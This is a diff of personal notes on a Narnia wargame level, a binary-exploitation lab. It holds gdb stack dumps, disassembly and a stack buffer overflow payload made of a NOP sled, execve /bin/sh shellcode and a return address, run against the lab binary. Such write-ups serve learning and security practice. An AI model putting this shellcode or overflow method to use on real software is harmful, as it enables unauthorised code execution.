@@ -29,7 +29,7 @@ int main(int argc, char **argv){
     exit(1);
 }
 
-output from gdb after strcpy is loaded with a 31 byte "U" string. the string is stored at $ebp-0x38.
+strcpy is loaded with a 31 byte "U" string, output:
 
 (gdb) x/28x $esp
 0xffffd658:     0xffffd680(esp)  0xffffd88e       0xffffffff       0xf7fc5000
@@ -49,12 +49,11 @@ Stack level 0, frame at 0xffffd6a0:
  Saved registers:
   ebp at 0xffffd698, eip at 0xffffd69c
 
-you can see the null terminator that completes the 32 byte array @ 0xffffd698+4
-also, found the esp, ebp, eip register through some digging.     @ 0xffffd658, 0xffffd6b8, 0xffffd6b8 + 4 respectively
- 
+notes: 
+the null terminator put at the end of the string @ 0xffffd698 + 4 (not that relevant, but cool to see in person)
+esp, ebp, eip registers @ 0xffffd658, 0xffffd6b8, 0xffffd6b8 + 4 respectively
 
-
-1.) attempting to solve level 3 with solution from level 2.
+1.) attempting to solve level 3 with solution from level 2. (nop slide + shell code + memory address)
 
 payload: 
 $(python -c 'print "\x90"*35 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd6\xff\xff"')
@@ -68,16 +67,18 @@ Breakpoint 1, 0x0804855f in main ()
 0xffffd678:     0x90909090      0x90909090      0x31909090      0x2f6850c0
 0xffffd688:     0x6868732f      0x6e69622f      0x5350e389      0xc289e189
 0xffffd698:     0x80cd0bb0      0xffffd660      0x00000000      0xffffd734
-
-looks good...
-shell does not appear
+                                     ^
+                                  altered
 
 narnia3@narnia:~$ /narnia/narnia3 $(python -c 'print "\x90"*35 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd6\xff\xff"')
 error opening 1Ph//shh/binPS̀`
 
-2) Examining second potential location for buffer overflow:  write(ofd, buf, sizeof(buf)-1);
-the size of buf is 32 bytes and the file pointed to by ofd is 16 characters long. 
-may be able to control/manipulate code execution.
+as expected, no shell appears, so we move on.
+
+2) examining the second potential overflow @ write(ofd, buf, sizeof(buf)-1);
+
+the size of buf is 32 bytes and the file pointed to by ofd is 16 characters long. so things can be overwritten here. 
+assembly for read included for easier comprehension since the two functions perform similarly.
 
 read(ifd, buf, sizeof(buf)-1)
    0x080485c0 <+181>:   push   $0x1f                    pushing 31, sizeof(buf)-1 onto the stack
@@ -94,5 +95,4 @@ write(ofd, buf, sizeof(buf)-1)
    0x080485d7 <+204>:   pushl  -0x4(%ebp)               pushing address of file pointed to by ofd onto stack
    0x080485da <+207>:   call   0x80483e0 <write@plt>
 
-the write function is transferring 31 bytes of buf into the file address pointed at by ofd. let's try to observe this at
-a low-level.
+the write function transfers 31 bytes of buf into the file address pointed at by ofd. let's pull out the scalpel.
